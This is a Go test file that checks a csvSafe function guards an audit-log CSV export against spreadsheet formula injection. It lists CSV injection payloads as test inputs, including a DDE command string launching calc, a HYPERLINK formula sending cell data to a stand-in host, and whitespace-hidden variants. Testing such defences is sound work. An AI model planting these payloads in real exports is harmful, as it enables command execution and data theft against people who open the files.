package handler

import "testing"

// The audit CSV export carries several attacker-supplied columns — user_agent
// is a raw request header, and actor_display_name, resource_name and metadata
// all contain user-chosen text. encoding/csv quotes them so they parse back
// correctly, but a spreadsheet still reads a leading =, +, - or @ as a
// formula, so an attacker could plant one and wait for an administrator to
// open the export.
func TestCSVSafeNeutralisesFormulas(t *testing.T) {
	dangerous := []string{
		`=cmd|'/c calc'!A1`,
		`=HYPERLINK("https://evil.test?d="&A1,"Click")`,
		`+1+1`,
		`-1+1`,
		`@SUM(A1:A9)`,
		"\t=1+1",   // tab first: hides the sigil from a reviewer, not from Excel
		" =1+1",    // leading space, same idea
		"\r\n@foo", // leading CRLF
	}
	for _, in := range dangerous {
		got := csvSafe(in)
		if got == in {
			t.Errorf("csvSafe(%q) left the value unchanged", in)
			continue
		}
		if got[0] != '\'' {
			t.Errorf("csvSafe(%q) = %q, want a leading apostrophe", in, got)
		}
	}
}

func TestCSVSafeLeavesOrdinaryValuesAlone(t *testing.T) {
	for _, in := range []string{
		"",
		"user.login",
		"Ali Jaradat",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
		"203.0.113.9",
		`{"email":"a@b.test"}`,
		"2026-09-16T12:00:00Z",
		"inbox deleted - qa-signup-flow", // a dash mid-string is not a formula
	} {
		if got := csvSafe(in); got != in {
			t.Errorf("csvSafe(%q) = %q, want it unchanged", in, got)
		}
	}
}

func TestCSVRowAppliesToEveryField(t *testing.T) {
	row := csvRow("ok", "=evil()", "also ok", "@evil")
	if row[0] != "ok" || row[2] != "also ok" {
		t.Error("ordinary fields were modified")
	}
	if row[1][0] != '\'' || row[3][0] != '\'' {
		t.Errorf("dangerous fields not neutralised: %q", row)
	}
	if len(row) != 4 {
		t.Errorf("row length = %d, want 4", len(row))
	}
}
